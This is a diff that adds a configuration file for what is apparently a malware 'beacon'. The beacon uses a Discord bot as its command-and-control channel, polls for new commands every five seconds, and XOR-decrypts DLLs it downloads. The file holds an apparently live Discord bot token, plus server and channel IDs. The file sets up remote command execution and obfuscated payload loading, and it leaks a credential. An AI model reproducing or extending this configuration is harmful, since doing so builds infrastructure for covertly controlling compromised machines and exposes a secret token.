@@ -1,0 +1,27 @@
+# Beacon Configuration
+# This file is embedded at compile time
+
+[discord]
+# Discord API base URL
+api_url = "https://discord.com/api/v10"
+
+# Bot token from Discord Developer Portal
+# REPLACE THIS with your actual bot token
+bot_token = "MTQ2NDYyNTU2MDEwOTE4NzE2Mw.GPS-D8.HToLQIxlZ8imoHtAnFeWX0uarBRtPOZXfH5q_k"
+
+# Guild (Server) ID where the beacon operates
+# REPLACE THIS with your server ID
+guild_id = "1464628151505129555"
+
+# Channel ID for general notifications (e.g., #general)
+# REPLACE THIS with your notification channel ID
+general_channel_id = "1464628153451548816"
+
+[settings]
+# How often to poll for new commands (in seconds)
+poll_interval_secs = 5
+
+[crypto]
+# XOR key for decrypting downloaded DLLs (hex string)
+# Example: "deadbeef" = 4 bytes XOR key
+xor_key = "41"
